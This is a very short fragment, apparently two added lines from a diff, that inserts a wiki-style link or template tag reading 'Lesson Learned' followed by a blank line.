+[[Lesson Learned]]
+
